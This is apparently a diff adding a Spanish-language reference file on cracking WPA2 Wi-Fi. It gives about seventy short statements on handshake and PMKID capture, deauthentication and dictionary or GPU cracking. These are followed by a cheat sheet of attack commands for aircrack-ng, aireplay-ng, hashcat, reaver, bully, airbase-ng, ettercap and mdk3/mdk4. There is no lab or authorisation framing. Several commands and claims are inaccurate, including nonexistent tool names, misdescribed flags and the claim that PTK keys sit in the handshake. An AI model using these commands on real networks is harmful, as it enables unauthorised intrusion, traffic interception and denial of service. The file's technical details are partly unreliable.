@@ -1,0 +1,135 @@
+El handshake WPA2 se captura mediante herramientas como aireplay-ng y airodump-ng.
+El cifrado AES de WPA2 utiliza bloques de 128 bits con claves dinámicas para cada cliente.
+Los diccionarios personalizados aumentan la efectividad en ataques por fuerza bruta WPA2.
+El PMK (Pairwise Master Key) se deriva usando la passphrase y el SSID del punto de acceso.
+Herramientas como hashcat emplean CUDA para acelerar el crackeo del handshake WPA2.
+Los ataques de PMKID se realizan sin necesidad de capturar el handshake tradicional.
+La precomputación de hashes mediante rainbow tables puede acelerar ataques WPA2.
+WPA2 con AES es vulnerable si las contraseñas son débiles o comunes en diccionarios.
+El ataque de desautenticación fuerza a los clientes a reconectarse para capturar handshakes.
+La clave PTK (Pairwise Transient Key) se genera durante el proceso de 4-way handshake.
+GPUs de alta potencia permiten calcular millones de hashes WPA2 en segundos.
+La opción --show de hashcat valida si la clave descifrada coincide con el handshake.
+La entropía baja en contraseñas WPA2 hace que sean vulnerables a fuerza bruta efectiva.
+Los ataques con PMKID requieren solicitudes de autenticación al punto de acceso.
+El archivo .cap contiene el handshake WPA2 capturado y se usa para ataques offline.
+Herramientas como hcxtools extraen PMKIDs directamente del tráfico de autenticación.
+La captura de handshakes requiere un cliente conectado al punto de acceso WPA2.
+El protocolo WPA2 utiliza CCMP (Counter Mode with Cipher Block Chaining Message).
+Un diccionario bien diseñado debe incluir variantes comunes de contraseñas conocidas.
+El cracking WPA2 se acelera al eliminar handshakes no válidos con herramientas específicas.
+Wireshark permite analizar paquetes y confirmar la presencia del handshake WPA2.
+El ataque de fuerza bruta prueba múltiples combinaciones contra el handshake cifrado.
+Los routers con WPS activado son más vulnerables a ataques combinados con WPA2.
+El modo monitor de la tarjeta WiFi es esencial para capturar tráfico de red WPA2.
+El algoritmo PBKDF2 genera las claves WPA2 mediante 4096 iteraciones de hashing.
+La eficiencia del crackeo WPA2 depende de la potencia de cálculo y del diccionario usado.
+Las herramientas de cracking modernas admiten handshakes WPA2 en formato hashcat HCCAPX.
+La longitud mínima recomendada para WPA2 es de 16 caracteres aleatorios y únicos.
+Los clientes vulnerables pueden filtrar handshakes WPA2 al cambiar entre redes.
+PMKID se obtiene interceptando el tráfico inicial de autenticación de un cliente WPA2.
+El cifrado CCMP utiliza un esquema de clave única para integridad y confidencialidad.
+La sincronización incorrecta de relojes puede invalidar handshakes capturados WPA2.
+La autenticación WPA2 se basa en EAPOL para intercambiar información inicial.
+El ataque con GPU requiere convertir el handshake al formato adecuado para hashcat.
+Ataques combinados prueban diccionarios y variaciones en tiempo real para WPA2.
+El SSID oculto aún puede revelarse al capturar y analizar tráfico WPA2.
+Crackear WPA2 depende de diccionarios que incluyan claves comunes y personalizadas.
+Los dispositivos IoT suelen emplear contraseñas WPA2 débiles por defecto.
+La implementación de PMKID en WPA2 facilita ataques offline si está mal configurada.
+Los handshakes múltiples aumentan la probabilidad de capturar datos completos WPA2.
+Una contraseña WPA2 robusta debe contener caracteres especiales, números y mayúsculas.
+El protocolo CCMP evita ataques de repetición pero es débil ante claves predictibles.
+La herramienta cowpatty verifica rápidamente claves en archivos de handshake WPA2.
+EAPOL (Extensible Authentication Protocol) inicia el proceso de intercambio de claves.
+Los ataques de diccionario WPA2 son menos efectivos con claves aleatorias largas.
+Las tablas arcoíris requieren mucha memoria pero aceleran la verificación de WPA2.
+El hash PBKDF2 de WPA2 se refuerza con sal (SSID) para reducir colisiones.
+Los ataques de fuerza bruta WPA2 pueden fallar ante contraseñas alfanuméricas fuertes.
+Crackear WPA2 depende de combinar fuerza bruta, diccionarios y claves precomputadas.
+El 4-way handshake contiene los datos necesarios para derivar claves WPA2.
+Hashcat admite ataques en clúster, repartiendo tareas entre múltiples GPUs.
+El tráfico cifrado WPA2 puede contener información reveladora si no se usa HTTPS.
+Los puntos de acceso abiertos son un vector para capturar tráfico WPA2 de clientes.
+Ataques de desautenticación se realizan enviando paquetes maliciosos al cliente WPA2.
+La segmentación del tráfico WPA2 dificulta la recolección de datos completos.
+El cifrado WPA2 debe evitar contraseñas compartidas para minimizar riesgos.
+La configuración PSK WPA2 debe incluir cambios regulares de claves compartidas.
+Herramientas de cracking como Aircrack-ng automatizan los ataques WPA2.
+El análisis de handshake WPA2 verifica su integridad antes de ejecutar fuerza bruta.
+WPA3 introduce SAE como alternativa robusta a los handshakes de WPA2.
+El sniffing de tráfico WPA2 requiere posicionamiento cercano al punto de acceso.
+Una contraseña WPA2 de menos de 8 caracteres es fácilmente vulnerable a ataques.
+El uso de diccionarios incrementales maximiza la eficiencia del cracking WPA2.
+Capturar PMKID puede evitar depender de la interacción con clientes WPA2.
+Un router con firmware actualizado reduce vulnerabilidades en WPA2.
+El uso de servicios VPN mitiga el impacto de redes WPA2 comprometidas.
+Clientes desconectados pueden forzar el reintento de handshake en redes WPA2.
+Ataques offline WPA2 eliminan la necesidad de estar conectado a la red objetivo.
+Claves WPA2 predictibles aumentan la posibilidad de éxito en cracking por diccionario.
+Capturas WPA2 se validan comprobando la presencia de claves PTK en el handshake.
+airmon-ng start wlan0: Habilita el modo monitor para capturar tráfico inalámbrico.
+airodump-ng wlan0mon: Captura paquetes y muestra puntos de acceso cercanos.
+aireplay-ng -0 10 -a <BSSID> wlan0mon: Realiza un ataque de desautenticación.
+airodump-ng -c <canal> --bssid <BSSID> -w captura wlan0mon: Fija el objetivo y canal.
+aircrack-ng -w <diccionario> -b <BSSID> captura.cap: Fuerza bruta al handshake.
+hashcat -m 2500 captura.hccapx <diccionario>: Crackea handshake con GPU.
+hcxpcapngtool -o captura.hccapx captura.cap: Convierte archivos .cap para hashcat.
+aireplay-ng --deauth 5 -a <BSSID> -c <MAC> wlan0mon: Expulsa un cliente específico.
+iwconfig wlan0 mode monitor: Activa el modo monitor manualmente en interfaces WiFi.
+hcxdumptool -i wlan0mon --enable_status=1 -o captura.pcapng: Captura PMKID directo.
+aircrack-ng captura.cap: Descifra claves WPA2 basándose en handshakes válidos.
+airodump-ng --showack wlan0mon: Monitorea la intensidad de la señal de un objetivo.
+airolib-ng database.db --import passwd diccionario.txt: Prepara claves para WPA2.
+pyrit -r captura.cap -i diccionario.txt attack_passthrough: Crackea claves WPA2.
+macchanger -r wlan0: Cambia la dirección MAC de la tarjeta WiFi aleatoriamente.
+airodump-ng -d <BSSID> wlan0mon: Fija captura en un único punto de acceso.
+airbase-ng -e <SSID> -c <canal> wlan0mon: Configura un AP falso para ataques.
+aireplay-ng -3 -b <BSSID> wlan0mon: Inicia un ataque de reinyección ARP.
+cowpatty -f <diccionario> -r captura.cap -s <SSID>: Crackeo WPA2 básico offline.
+reaver -i wlan0mon -b <BSSID> -vv: Explota vulnerabilidades de WPS en routers.
+bully -b <BSSID> -c <canal> wlan0mon: Ataques de fuerza bruta a WPS activos.
+tshark -r captura.pcap -Y 'eapol': Filtra paquetes específicos de autenticación.
+tcpdump -i wlan0mon -w captura.pcap: Guarda tráfico inalámbrico en un archivo.
+wireshark captura.pcap: Analiza gráficamente handshakes y PMKID en WPA2.
+hcxtools --pmkid captura.pcapng -o pmkid_hash.txt: Extrae hashes PMKID.
+hcxhashcattool -i pmkid_hash.txt -o pmkid.hccapx: Convierte PMKID para hashcat.
+airodump-ng wlan0mon --wps: Detecta routers con WPS habilitado para ataques.
+aircrack-ng captura.cap -l clave.txt: Guarda la clave descifrada en un archivo.
+aireplay-ng -9 wlan0mon: Testea la inyección de paquetes en la interfaz monitor.
+ettercap -T -i wlan0mon: Realiza ataques de hombre en el medio en redes WiFi.
+aircrack-ng -e <SSID> -w diccionario.txt captura.cap: Busca claves por SSID.
+iw dev wlan0 set channel <canal>: Cambia manualmente de canal en modo monitor.
+hcxdumptool --filterlist_ap=<archivo>: Filtra APs específicos al capturar tráfico.
+pyrit eval -r captura.cap: Evalúa el handshake y su integridad en WPA2.
+tshark -T fields -e wlan.sa -r captura.pcap: Extrae direcciones MAC en el tráfico.
+hcxhashcattool --nonce-error-corrections=8 captura.pcapng: Ajusta errores en PMKID.
+mdk3 wlan0mon d -c <canal>: Realiza ataques DoS en un canal específico.
+wireshark -r captura.pcap -Y 'wlan.fc.type_subtype == 0x08': Filtra beacons.
+hashcat -a 3 -m 2500 captura.hccapx ?d?d?d?d?d?d?d?d: Fuerza bruta por máscara.
+hcxtools -o salida.pcapng -c <canal>: Captura tráfico específico para análisis.
+airolib-ng --batch database.db: Procesa grandes diccionarios para WPA2.
+aireplay-ng --fakeauth 0 -a <BSSID> wlan0mon: Simula autenticación en el AP.
+tcpdump -n -i wlan0mon 'type mgt subtype beacon': Muestra solo beacons WiFi.
+iw wlan0 interface add mon0 type monitor: Crea una interfaz en modo monitor.
+hcxpcapngtool -i wlan0mon --filtermode=AP --filterlist_ap=ap.txt: Captura APs.
+airodump-ng -U wlan0mon: Muestra solo APs ocultos en el tráfico de red.
+hashcat -O -w 3 -m 2500 captura.hccapx diccionario.txt: Optimiza cracking GPU.
+cowpatty -d rainbow_table/ -r captura.cap -s <SSID>: Uso de tablas arcoíris.
+bully -b <BSSID> -c <canal> --force: Intenta explotar WPS ignorando errores.
+aircrack-ng -a 2 -w diccionario.txt captura.cap: Específicamente WPA2 PSK.
+mdk4 wlan0mon m -t <BSSID>: Realiza ataques de fragmentación en WPA2.
+aireplay-ng -0 5 -a <BSSID> -c <MAC> wlan0mon: Ataques dirigidos por cliente.
+iwconfig wlan0 power off: Desactiva ahorro de energía en interfaces WiFi.
+iw dev wlan0 set txpower fixed 3000: Incrementa potencia de transmisión WiFi.
+hcxhashcattool --potfile-disable captura.hccapx: Evita archivos pot de cracking.
+airodump-ng wlan0mon --encrypt WPA2: Filtra solo APs con WPA2 activado.
+hcxdumptool --disable_client_attacks -i wlan0mon: Captura solo tráfico AP.
+aireplay-ng -1 0 -e <SSID> -a <BSSID> wlan0mon: Ataques de preautenticación.
+wireshark -r captura.pcap -Y 'eapol && wlan.da == <MAC>': Filtra cliente.
+reaver -i wlan0mon -b <BSSID> -K 1: Ataca WPS desactivando reintentos fallidos.
+pyrit batch -i lista_de_ataques.txt: Automiza ataques WPA2 en secuencia.
+aireplay-ng --fragment -a <BSSID> wlan0mon: Fragmenta tráfico para reinyección.
+aircrack-ng -q captura.cap: Modo silencioso para cracking WPA2.
+tcpdump -w captura.pcap -C 50 wlan0mon: Divide capturas en bloques de 50 MB.
+
